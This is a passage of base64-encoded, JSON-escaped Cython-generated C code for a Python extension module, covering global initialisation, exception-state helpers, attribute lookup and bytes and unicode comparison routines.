fcHl4X21zdGF0ZS0+X19weXhfbl91X2Zvd3MsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2VtYWlsLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9lLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9nZW5leHByLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9nZW5leHByfTtcbiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxM10gPSBfX1B5eF9QeUNvZGVfTmV3KGRlc2NyLCB2YXJuYW1lcywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF91X21fanFfcHksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3V1dSwgX19weXhfa19RX2NfYV9CX0FaelllZW9veV96X0NfQ19EX0RfSl9KLCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzEzXSkpIGdvdG8gYmFkO1xuICB9XG4gIHtcbiAgICBjb25zdCBfX1B5eF9QeUNvZGVfTmV3X2Z1bmN0aW9uX2Rlc2NyaXB0aW9uIGRlc2NyID0gezAsIDAsIDAsIDIsICh1bnNpZ25lZCBpbnQpKENPX09QVElNSVpFRHxDT19ORVdMT0NBTFMpLCA0NjUsIDU2fTtcbiAgICBQeU9iamVjdCogY29uc3QgdmFybmFtZXNbXSA9IHtfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9pLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV90fTtcbiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxNF0gPSBfX1B5eF9QeUNvZGVfTmV3KGRlc2NyLCB2YXJuYW1lcywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF91X21fanFfcHksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3ByaW50aW5nLCBfX3B5eF9rX1VfMV9JV0FXQV9xX3dhcV9RX2EsIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTRdKSkgZ290byBiYWQ7XG4gIH1cbiAgUHlfREVDUkVGKHR1cGxlX2RlZHVwX21hcCk7XG4gIHJldHVybiAwO1xuICBiYWQ6XG4gIFB5X0RFQ1JFRih0dXBsZV9kZWR1cF9tYXApO1xuICByZXR1cm4gLTE7XG59XG5cblxuc3RhdGljIGludCBfX1B5eF9Jbml0R2xvYmFscyh2b2lkKSB7XG4gIFxuICBpZiAobGlrZWx5KF9fUHl4X2luaXRfY29fdmFyaWFibGVzKCkgPT0gMCkpOyBlbHNlXG5cbmlmICh1bmxpa2VseShQeUVycl9PY2N1cnJlZCgpKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuXG4gIFxuICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxue1xuICAgIFB5T2JqZWN0ICp0eXBlc01vZHVsZT1OVUxMO1xuICAgIHR5cGVzTW9kdWxlID0gUHlJbXBvcnRfSW1wb3J0TW9kdWxlKCJ0eXBlcyIpO1xuICAgIGlmICh0eXBlc01vZHVsZSkge1xuICAgICAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX1B5eF9DYWNoZWRNZXRob2RUeXBlID0gUHlPYmplY3RfR2V0QXR0clN0cmluZyh0eXBlc01vZHVsZSwgIk1ldGhvZFR5cGUiKTtcbiAgICAgICAgUHlfREVDUkVGKHR5cGVzTW9kdWxlKTtcbiAgICB9XG59IC8vIGVycm9yIGhhbmRsaW5nIGZvbGxvd3NcbiNlbmRpZlxuXG5pZiAodW5saWtlbHkoUHlFcnJfT2NjdXJyZWQoKSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcblxuICByZXR1cm4gMDtcbiAgX19weXhfTDFfZXJyb3I6O1xuICByZXR1cm4gLTE7XG59XG5cblxuXG5cbiNpZmRlZiBfTVNDX1ZFUlxuI3ByYWdtYSB3YXJuaW5nKCBwdXNoIClcblxuI3ByYWdtYSB3YXJuaW5nKCBkaXNhYmxlIDogNDEyNyApXG4jZW5kaWZcblxuXG5cblxuXG5cblxuI2lmIENZVEhPTl9SRUZOQU5OWVxuc3RhdGljIF9fUHl4X1JlZk5hbm55QVBJU3RydWN0ICpfX1B5eF9SZWZOYW5ueUltcG9ydEFQSShjb25zdCBjaGFyICptb2RuYW1lKSB7XG4gICAgUHlPYmplY3QgKm0gPSBOVUxMLCAqcCA9IE5VTEw7XG4gICAgdm9pZCAqciA9IE5VTEw7XG4gICAgbSA9IFB5SW1wb3J0X0ltcG9ydE1vZHVsZShtb2RuYW1lKTtcbiAgICBpZiAoIW0pIGdvdG8gZW5kO1xuICAgIHAgPSBQeU9iamVjdF9HZXRBdHRyU3RyaW5nKG0sICJSZWZOYW5ueUFQSSIpO1xuICAgIGlmICghcCkgZ290byBlbmQ7XG4gICAgciA9IFB5TG9uZ19Bc1ZvaWRQdHIocCk7XG5lbmQ6XG4gICAgUHlfWERFQ1JFRihwKTtcbiAgICBQeV9YREVDUkVGKG0pO1xuICAgIHJldHVybiAoX19QeXhfUmVmTmFubnlBUElTdHJ1Y3QgKilyO1xufVxuI2VuZGlmXG5cblxuI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURVxuc3RhdGljIGludCBfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzVHVwbGUoUHlPYmplY3QgKmV4Y190eXBlLCBQeU9iamVjdCAqdHVwbGUpIHtcbiAgICBQeV9zc2l6ZV90IGksIG47XG4gICAgbiA9IFB5VHVwbGVfR0VUX1NJWkUodHVwbGUpO1xuICAgIGZvciAoaT0wOyBpPG47IGkrKykge1xuICAgICAgICBpZiAoZXhjX3R5cGUgPT0gUHlUdXBsZV9HRVRfSVRFTSh0dXBsZSwgaSkpIHJldHVybiAxO1xuICAgIH1cbiAgICBmb3IgKGk9MDsgaTxuOyBpKyspIHtcbiAgICAgICAgaWYgKF9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhleGNfdHlwZSwgUHlUdXBsZV9HRVRfSVRFTSh0dXBsZSwgaSkpKSByZXR1cm4gMTtcbiAgICB9XG4gICAgcmV0dXJuIDA7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlc0luU3RhdGUoUHlUaHJlYWRTdGF0ZSogdHN0YXRlLCBQeU9iamVjdCogZXJyKSB7XG4gICAgaW50IHJlc3VsdDtcbiAgICBQeU9iamVjdCAqZXhjX3R5cGU7XG4jaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDBBNlxuICAgIFB5T2JqZWN0ICpjdXJyZW50X2V4Y2VwdGlvbiA9IHRzdGF0ZS0+Y3VycmVudF9leGNlcHRpb247XG4gICAgaWYgKHVubGlrZWx5KCFjdXJyZW50X2V4Y2VwdGlvbikpIHJldHVybiAwO1xuICAgIGV4Y190eXBlID0gKFB5T2JqZWN0KikgUHlfVFlQRShjdXJyZW50X2V4Y2VwdGlvbik7XG4gICAgaWYgKGV4Y190eXBlID09IGVycikgcmV0dXJuIDE7XG4jZWxzZVxuICAgIGV4Y190eXBlID0gdHN0YXRlLT5jdXJleGNfdHlwZTtcbiAgICBpZiAoZXhjX3R5cGUgPT0gZXJyKSByZXR1cm4gMTtcbiAgICBpZiAodW5saWtlbHkoIWV4Y190eXBlKSkgcmV0dXJuIDA7XG4jZW5kaWZcbiAgICAjaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlNcbiAgICBQeV9JTkNSRUYoZXhjX3R5cGUpO1xuICAgICNlbmRpZlxuICAgIGlmICh1bmxpa2VseShQeVR1cGxlX0NoZWNrKGVycikpKSB7XG4gICAgICAgIHJlc3VsdCA9IF9fUHl4X1B5RXJyX0V4Y2VwdGlvbk1hdGNoZXNUdXBsZShleGNfdHlwZSwgZXJyKTtcbiAgICB9IGVsc2Uge1xuICAgICAgICByZXN1bHQgPSBfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoZXhjX3R5cGUsIGVycik7XG4gICAgfVxuICAgICNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgIFB5X0RFQ1JFRihleGNfdHlwZSk7XG4gICAgI2VuZGlmXG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEVcbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfRXJyUmVzdG9yZUluU3RhdGUoUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqdHlwZSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqdGIpIHtcbiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMEE2XG4gICAgUHlPYmplY3QgKnRtcF92YWx1ZTtcbiAgICBhc3NlcnQodHlwZSA9PSBOVUxMIHx8ICh2YWx1ZSAhPSBOVUxMICYmIHR5cGUgPT0gKFB5T2JqZWN0KikgUHlfVFlQRSh2YWx1ZSkpKTtcbiAgICBpZiAodmFsdWUpIHtcbiAgICAgICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuICAgICAgICBpZiAodW5saWtlbHkoKChQeUJhc2VFeGNlcHRpb25PYmplY3QqKSB2YWx1ZSktPnRyYWNlYmFjayAhPSB0YikpXG4gICAgICAgICNlbmRpZlxuICAgICAgICAgICAgUHlFeGNlcHRpb25fU2V0VHJhY2ViYWNrKHZhbHVlLCB0Yik7XG4gICAgfVxuICAgIHRtcF92YWx1ZSA9IHRzdGF0ZS0+Y3VycmVudF9leGNlcHRpb247XG4gICAgdHN0YXRlLT5jdXJyZW50X2V4Y2VwdGlvbiA9IHZhbHVlO1xuICAgIFB5X1hERUNSRUYodG1wX3ZhbHVlKTtcbiAgICBQeV9YREVDUkVGKHR5cGUpO1xuICAgIFB5X1hERUNSRUYodGIpO1xuI2Vsc2VcbiAgICBQeU9iamVjdCAqdG1wX3R5cGUsICp0bXBfdmFsdWUsICp0bXBfdGI7XG4gICAgdG1wX3R5cGUgPSB0c3RhdGUtPmN1cmV4Y190eXBlO1xuICAgIHRtcF92YWx1ZSA9IHRzdGF0ZS0+Y3VyZXhjX3ZhbHVlO1xuICAgIHRtcF90YiA9IHRzdGF0ZS0+Y3VyZXhjX3RyYWNlYmFjaztcbiAgICB0c3RhdGUtPmN1cmV4Y190eXBlID0gdHlwZTtcbiAgICB0c3RhdGUtPmN1cmV4Y192YWx1ZSA9IHZhbHVlO1xuICAgIHRzdGF0ZS0+Y3VyZXhjX3RyYWNlYmFjayA9IHRiO1xuICAgIFB5X1hERUNSRUYodG1wX3R5cGUpO1xuICAgIFB5X1hERUNSRUYodG1wX3ZhbHVlKTtcbiAgICBQeV9YREVDUkVGKHRtcF90Yik7XG4jZW5kaWZcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfRXJyRmV0Y2hJblN0YXRlKFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSwgUHlPYmplY3QgKip0eXBlLCBQeU9iamVjdCAqKnZhbHVlLCBQeU9iamVjdCAqKnRiKSB7XG4jaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDBBNlxuICAgIFB5T2JqZWN0KiBleGNfdmFsdWU7XG4gICAgZXhjX3ZhbHVlID0gdHN0YXRlLT5jdXJyZW50X2V4Y2VwdGlvbjtcbiAgICB0c3RhdGUtPmN1cnJlbnRfZXhjZXB0aW9uID0gMDtcbiAgICAqdmFsdWUgPSBleGNfdmFsdWU7XG4gICAgKnR5cGUgPSBOVUxMO1xuICAgICp0YiA9IE5VTEw7XG4gICAgaWYgKGV4Y192YWx1ZSkge1xuICAgICAgICAqdHlwZSA9IChQeU9iamVjdCopIFB5X1RZUEUoZXhjX3ZhbHVlKTtcbiAgICAgICAgUHlfSU5DUkVGKCp0eXBlKTtcbiAgICAgICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuICAgICAgICAqdGIgPSAoKFB5QmFzZUV4Y2VwdGlvbk9iamVjdCopIGV4Y192YWx1ZSktPnRyYWNlYmFjaztcbiAgICAgICAgUHlfWElOQ1JFRigqdGIpO1xuICAgICAgICAjZWxzZVxuICAgICAgICAqdGIgPSBQeUV4Y2VwdGlvbl9HZXRUcmFjZWJhY2soZXhjX3ZhbHVlKTtcbiAgICAgICAgI2VuZGlmXG4gICAgfVxuI2Vsc2VcbiAgICAqdHlwZSA9IHRzdGF0ZS0+Y3VyZXhjX3R5cGU7XG4gICAgKnZhbHVlID0gdHN0YXRlLT5jdXJleGNfdmFsdWU7XG4gICAgKnRiID0gdHN0YXRlLT5jdXJleGNfdHJhY2ViYWNrO1xuICAgIHRzdGF0ZS0+Y3VyZXhjX3R5cGUgPSAwO1xuICAgIHRzdGF0ZS0+Y3VyZXhjX3ZhbHVlID0gMDtcbiAgICB0c3RhdGUtPmN1cmV4Y190cmFjZWJhY2sgPSAwO1xuI2VuZGlmXG59XG4jZW5kaWZcblxuXG4jaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihQeU9iamVjdCogb2JqLCBQeU9iamVjdCogYXR0cl9uYW1lKSB7XG4gICAgUHlUeXBlT2JqZWN0KiB0cCA9IFB5X1RZUEUob2JqKTtcbiAgICBpZiAobGlrZWx5KHRwLT50cF9nZXRhdHRybykpXG4gICAgICAgIHJldHVybiB0cC0+dHBfZ2V0YXR0cm8ob2JqLCBhdHRyX25hbWUpO1xuICAgIHJldHVybiBQeU9iamVjdF9HZXRBdHRyKG9iaiwgYXR0cl9uYW1lKTtcbn1cbiNlbmRpZlxuXG5cbiNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzBkMDAwMFxuc3RhdGljIHZvaWQgX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cl9DbGVhckF0dHJpYnV0ZUVycm9yKHZvaWQpIHtcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgIGlmIChsaWtlbHkoX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlcyhQeUV4Y19BdHRyaWJ1dGVFcnJvcikpKVxuICAgICAgICBfX1B5eF9QeUVycl9DbGVhcigpO1xufVxuI2VuZGlmXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfR2V0QXR0clN0ck5vRXJyb3IoUHlPYmplY3QqIG9iaiwgUHlPYmplY3QqIGF0dHJfbmFtZSkge1xuICAgIFB5T2JqZWN0ICpyZXN1bHQ7XG4jaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwXG4gICAgKHZvaWQpIFB5T2JqZWN0X0dldE9wdGlvbmFsQXR0cihvYmosIGF0dHJfbmFtZSwgJnJlc3VsdCk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbiNlbHNlXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuICAgIFB5VHlwZU9iamVjdCogdHAgPSBQeV9UWVBFKG9iaik7XG4gICAgaWYgKGxpa2VseSh0cC0+dHBfZ2V0YXR0cm8gPT0gUHlPYmplY3RfR2VuZXJpY0dldEF0dHIpKSB7XG4gICAgICAgIHJldHVybiBfUHlPYmplY3RfR2VuZXJpY0dldEF0dHJXaXRoRGljdChvYmosIGF0dHJfbmFtZSwgTlVMTCwgMSk7XG4gICAgfVxuI2VuZGlmXG4gICAgcmVzdWx0ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihvYmosIGF0dHJfbmFtZSk7XG4gICAgaWYgKHVubGlrZWx5KCFyZXN1bHQpKSB7XG4gICAgICAgIF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHJfQ2xlYXJBdHRyaWJ1dGVFcnJvcigpO1xuICAgIH1cbiAgICByZXR1cm4gcmVzdWx0O1xuI2VuZGlmXG59XG5cblxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9HZXRCdWlsdGluTmFtZShQeU9iamVjdCAqbmFtZSkge1xuICAgIFB5T2JqZWN0KiByZXN1bHQgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyTm9FcnJvcihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9iLCBuYW1lKTtcbiAgICBpZiAodW5saWtlbHkoIXJlc3VsdCkgJiYgIVB5RXJyX09jY3VycmVkKCkpIHtcbiAgICAgICAgUHlFcnJfRm9ybWF0KFB5RXhjX05hbWVFcnJvcixcbiAgICAgICAgICAgICJuYW1lIFwnJVVcJyBpcyBub3QgZGVmaW5lZCIsIG5hbWUpO1xuICAgIH1cbiAgICByZXR1cm4gcmVzdWx0O1xufVxuXG5cbiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqXG5fX1B5eF9QeVR1cGxlX0Zyb21BcnJheShQeU9iamVjdCAqY29uc3QgKnNyYywgUHlfc3NpemVfdCBuKVxue1xuICAgIFB5T2JqZWN0ICpyZXM7XG4gICAgUHlfc3NpemVfdCBpO1xuICAgIGlmIChuIDw9IDApIHtcbiAgICAgICAgcmV0dXJuIF9fUHl4X05ld1JlZihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV90dXBsZSk7XG4gICAgfVxuICAgIHJlcyA9IFB5VHVwbGVfTmV3KG4pO1xuICAgIGlmICh1bmxpa2VseShyZXMgPT0gTlVMTCkpIHJldHVybiBOVUxMO1xuICAgIGZvciAoaSA9IDA7IGkgPCBuOyBpKyspIHtcbiAgICAgICAgaWYgKHVubGlrZWx5KF9fUHl4X1B5VHVwbGVfU0VUX0lURU0ocmVzLCBpLCBzcmNbaV0pIDwgKDApKSkge1xuICAgICAgICAgICAgUHlfREVDUkVGKHJlcyk7XG4gICAgICAgICAgICByZXR1cm4gTlVMTDtcbiAgICAgICAgfVxuICAgICAgICBQeV9JTkNSRUYoc3JjW2ldKTtcbiAgICB9XG4gICAgcmV0dXJuIHJlcztcbn1cbiNlbGlmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9jb3B5X29iamVjdF9hcnJheShQeU9iamVjdCAqY29uc3QgKkNZVEhPTl9SRVNUUklDVCBzcmMsIFB5T2JqZWN0KiogQ1lUSE9OX1JFU1RSSUNUIGRlc3QsIFB5X3NzaXplX3QgbGVuZ3RoKSB7XG4gICAgUHlPYmplY3QgKnY7XG4gICAgUHlfc3NpemVfdCBpO1xuICAgIGZvciAoaSA9IDA7IGkgPCBsZW5ndGg7IGkrKykge1xuICAgICAgICB2ID0gZGVzdFtpXSA9IHNyY1tpXTtcbiAgICAgICAgUHlfSU5DUkVGKHYpO1xuICAgIH1cbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpcbl9fUHl4X1B5VHVwbGVfRnJvbUFycmF5KFB5T2JqZWN0ICpjb25zdCAqc3JjLCBQeV9zc2l6ZV90IG4pXG57XG4gICAgUHlPYmplY3QgKnJlcztcbiAgICBpZiAobiA8PSAwKSB7XG4gICAgICAgIHJldHVybiBfX1B5eF9OZXdSZWYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdHVwbGUpO1xuICAgIH1cbiAgICByZXMgPSBQeVR1cGxlX05ldyhuKTtcbiAgICBpZiAodW5saWtlbHkocmVzID09IE5VTEwpKSByZXR1cm4gTlVMTDtcbiAgICBfX1B5eF9jb3B5X29iamVjdF9hcnJheShzcmMsICgoUHlUdXBsZU9iamVjdCopcmVzKS0+b2JfaXRlbSwgbik7XG4gICAgcmV0dXJuIHJlcztcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpcbl9fUHl4X1B5TGlzdF9Gcm9tQXJyYXkoUHlPYmplY3QgKmNvbnN0ICpzcmMsIFB5X3NzaXplX3QgbilcbntcbiAgICBQeU9iamVjdCAqcmVzO1xuICAgIGlmIChuIDw9IDApIHtcbiAgICAgICAgcmV0dXJuIFB5TGlzdF9OZXcoMCk7XG4gICAgfVxuICAgIHJlcyA9IFB5TGlzdF9OZXcobik7XG4gICAgaWYgKHVubGlrZWx5KHJlcyA9PSBOVUxMKSkgcmV0dXJuIE5VTEw7XG4gICAgX19QeXhfY29weV9vYmplY3RfYXJyYXkoc3JjLCAoKFB5TGlzdE9iamVjdCopcmVzKS0+b2JfaXRlbSwgbik7XG4gICAgcmV0dXJuIHJlcztcbn1cbiNlbmRpZlxuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeUJ5dGVzX0VxdWFscyhQeU9iamVjdCogczEsIFB5T2JqZWN0KiBzMiwgaW50IGVxdWFscykge1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fR1JBQUwgfHxcXFxuICAgICAgICAhKENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFICYmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MpXG4gICAgcmV0dXJuIFB5T2JqZWN0X1JpY2hDb21wYXJlQm9vbChzMSwgczIsIGVxdWFscyk7XG4jZWxzZVxuICAgIGlmIChzMSA9PSBzMikge1xuICAgICAgICByZXR1cm4gKGVxdWFscyA9PSBQeV9FUSk7XG4gICAgfSBlbHNlIGlmIChQeUJ5dGVzX0NoZWNrRXhhY3QoczEpICYgUHlCeXRlc19DaGVja0V4YWN0KHMyKSkge1xuICAgICAgICBjb25zdCBjaGFyICpwczEsICpwczI7XG4gICAgICAgIFB5X3NzaXplX3QgbGVuZ3RoID0gUHlCeXRlc19HRVRfU0laRShzMSk7XG4gICAgICAgIGlmIChsZW5ndGggIT0gUHlCeXRlc19HRVRfU0laRShzMikpXG4gICAgICAgICAgICByZXR1cm4gKGVxdWFscyA9PSBQeV9ORSk7XG4gICAgICAgIHBzMSA9IFB5Qnl0ZXNfQVNfU1RSSU5HKHMxKTtcbiAgICAgICAgcHMyID0gUHlCeXRlc19BU19TVFJJTkcoczIpO1xuICAgICAgICBpZiAocHMxWzBdICE9IHBzMlswXSkge1xuICAgICAgICAgICAgcmV0dXJuIChlcXVhbHMgPT0gUHlfTkUpO1xuICAgICAgICB9IGVsc2UgaWYgKGxlbmd0aCA9PSAxKSB7XG4gICAgICAgICAgICByZXR1cm4gKGVxdWFscyA9PSBQeV9FUSk7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBpbnQgcmVzdWx0O1xuI2lmIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFMgJiYgKFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBCMDAwMClcbiAgICAgICAgICAgIFB5X2hhc2hfdCBoYXNoMSwgaGFzaDI7XG4gICAgICAgICAgICBoYXNoMSA9ICgoUHlCeXRlc09iamVjdCopczEpLT5vYl9zaGFzaDtcbiAgICAgICAgICAgIGhhc2gyID0gKChQeUJ5dGVzT2JqZWN0KilzMiktPm9iX3NoYXNoO1xuICAgICAgICAgICAgaWYgKGhhc2gxICE9IGhhc2gyICYmIGhhc2gxICE9IC0xICYmIGhhc2gyICE9IC0xKSB7XG4gICAgICAgICAgICAgICAgcmV0dXJuIChlcXVhbHMgPT0gUHlfTkUpO1xuICAgICAgICAgICAgfVxuI2VuZGlmXG4gICAgICAgICAgICByZXN1bHQgPSBtZW1jbXAocHMxLCBwczIsIChzaXplX3QpbGVuZ3RoKTtcbiAgICAgICAgICAgIHJldHVybiAoZXF1YWxzID09IFB5X0VRKSA/IChyZXN1bHQgPT0gMCkgOiAocmVzdWx0ICE9IDApO1xuICAgICAgICB9XG4gICAgfSBlbHNlIGlmICgoczEgPT0gUHlfTm9uZSkgJiBQeUJ5dGVzX0NoZWNrRXhhY3QoczIpKSB7XG4gICAgICAgIHJldHVybiAoZXF1YWxzID09IFB5X05FKTtcbiAgICB9IGVsc2UgaWYgKChzMiA9PSBQeV9Ob25lKSAmIFB5Qnl0ZXNfQ2hlY2tFeGFjdChzMSkpIHtcbiAgICAgICAgcmV0dXJuIChlcXVhbHMgPT0gUHlfTkUpO1xuICAgIH0gZWxzZSB7XG4gICAgICAgIGludCByZXN1bHQ7XG4gICAgICAgIFB5T2JqZWN0KiBweV9yZXN1bHQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShzMSwgczIsIGVxdWFscyk7XG4gICAgICAgIGlmICghcHlfcmVzdWx0KVxuICAgICAgICAgICAgcmV0dXJuIC0xO1xuICAgICAgICByZXN1bHQgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUocHlfcmVzdWx0KTtcbiAgICAgICAgUHlfREVDUkVGKHB5X3Jlc3VsdCk7XG4gICAgICAgIHJldHVybiByZXN1bHQ7XG4gICAgfVxuI2VuZGlmXG59XG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5VW5pY29kZV9FcXVhbHMoUHlPYmplY3QqIHMxLCBQeU9iamVjdCogczIsIGludCBlcXVhbHMpIHtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMXG4gICAgcmV0dXJuIFB5T2JqZWN0X1JpY2hDb21wYXJlQm9vbChzMSwgczIsIGVxdWFscyk7XG4jZWxzZVxuICAgIGludCBzMV9pc191bmljb2RlLCBzMl9pc191bmljb2RlO1xuICAgIGlmIChzMSA9PSBzMikge1xuICAgICAgICBnb3RvIHJldHVybl9lcTtcbiAgICB9XG4gICAgczFfaXNfdW5pY29kZSA9IFB5VW5pY29kZV9DaGVja0V4YWN0KHMxKTtcbiAgICBzMl9pc191bmljb2RlID0gUHlVbmljb2RlX0NoZWNrRXhhY3QoczIpO1xuICAgIGlmIChzMV9pc191bmljb2RlICYgczJfaXNfdW5pY29kZSkge1xuICAgICAgICBQeV9zc2l6ZV90IGxlbmd0aCwgbGVuZ3RoMjtcbiAgICAgICAgaW50IGtpbmQ7XG4gICAgICAgIHZvaWQgKmRhdGExLCAqZGF0YTI7XG4gICAgICAgICNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgICAgICBpZiAodW5saWtlbHkoX19QeXhfUHlVbmljb2RlX1JFQURZKHMxKSA8IDApIHx8IHVubGlrZWx5KF9fUHl4X1B5VW5pY29kZV9SRUFEWShzMikgPCAwKSlcbiAgICAgICAgICAgIHJldHVybiAtMTtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIGxlbmd0aCA9IF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKHMxKTtcbiAgICAgICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgICAgICBpZiAodW5saWtlbHkobGVuZ3RoIDwgMCkpIHJldHVybiAtMTtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIGxlbmd0aDIgPSBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChzMik7XG4gICAgICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgICAgICAgaWYgKHVubGlrZWx5KGxlbmd0aDIgPCAwKSkgcmV0dXJuIC0xO1xuICAgICAgICAjZW5kaWZcbiAgICAgICAgaWYgKGxlbmd0aCAhPSBsZW5ndGgyKSB7XG4gICAgICAgICAgICBnb3RvIHJldHVybl9uZTtcbiAgICAgICAgfVxuI2lmIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFNcbiAgICAgICAge1xuICAgICAgICAgICAgUHlfaGFzaF90IGhhc2gxLCBoYXNoMjtcbiAgICAgICAgICAgIGhhc2gxID0gKChQeUFTQ0lJT2JqZWN0KilzMSktPmhhc2g7XG4gICAgICAgICAgICBoYXNoMiA9ICgoUHlBU0NJSU9iamVjdCopczIpLT5oYXNoO1xuICAgICAgICAgICAgaWYgKGhhc2gxICE9IGhhc2gyICYmIGhhc2gxICE9IC0xICYmIGhhc2gyICE9IC0xKSB7XG4gICAgICAgICAgICAgICAgZ290byByZXR1cm5fbmU7XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiNlbmRpZlxuICAgICAgICBraW5kID0gX19QeXhfUHlVbmljb2RlX0tJTkQoczEpO1xuICAgICAgICBpZiAoa2luZCAhPSBfX1B5eF9QeVVuaWNvZGVfS0lORChzMikpIHtcbiAgICAgICAgICAgIGdvdG8gcmV0dXJuX25lO1xuICAgICAgICB9XG4gICAgICAgIGRhdGExID0gX19QeXhfUHlVbmljb2RlX0RBVEEoczEpO1xuICAg